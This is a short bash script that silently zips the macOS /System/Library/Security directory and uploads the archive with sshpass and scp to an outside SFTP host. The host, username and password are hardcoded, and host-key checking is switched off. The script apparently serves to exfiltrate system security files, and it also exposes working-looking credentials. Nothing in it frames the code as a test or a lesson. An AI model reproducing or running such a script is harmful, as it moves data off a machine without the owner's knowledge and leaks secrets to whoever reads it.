
cd $home/../../../System/Library/
#archeiving files
echo "zipping silently"
zip -qr Security_unmodified.zip Security && echo "Archiving complete!"
# Configuration
LOCAL_FILE="Security_unmodified.zip"
REMOTE_USER="fbb63a5ef02b44fbba92f30d84f59364"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="IgTYRB9xm4lgOxFhsEgLJfcRnJr6W4Fq"
REMOTE_DEST="/"


# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"

# Check if the upload was successful
if [[ $? -eq 0 ]]; then
    echo "connection sucesfully"
else
    echo "connection failed."
fi
